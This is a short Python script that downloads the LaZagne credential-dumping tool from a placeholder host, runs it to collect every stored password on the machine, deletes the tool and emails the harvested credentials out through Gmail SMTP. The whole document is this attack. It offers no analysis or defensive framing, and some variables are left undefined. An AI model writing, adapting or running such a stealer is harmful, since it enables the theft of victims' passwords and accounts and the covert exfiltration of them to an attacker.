#!/usr/bin/env python 
import requests 

import subprocess 
import smtplib
import re 
import os , tempfile

def download_url(url):
    get_response = requests.get(url)
    url_file = url.split("-")[-1]

    with open(url_file , "wb") as f:
        f.write(get_response.content)     

def send_email(email,password ,message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(from_email, to_email ,message)
    server.quit()

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download_url("http://IP_address/laZagne.exe")
command = "laZagne all"
result = subprocess.check_output(command,shell=True)
os.remove("laZagne.exe")
send_email(email,password, result)

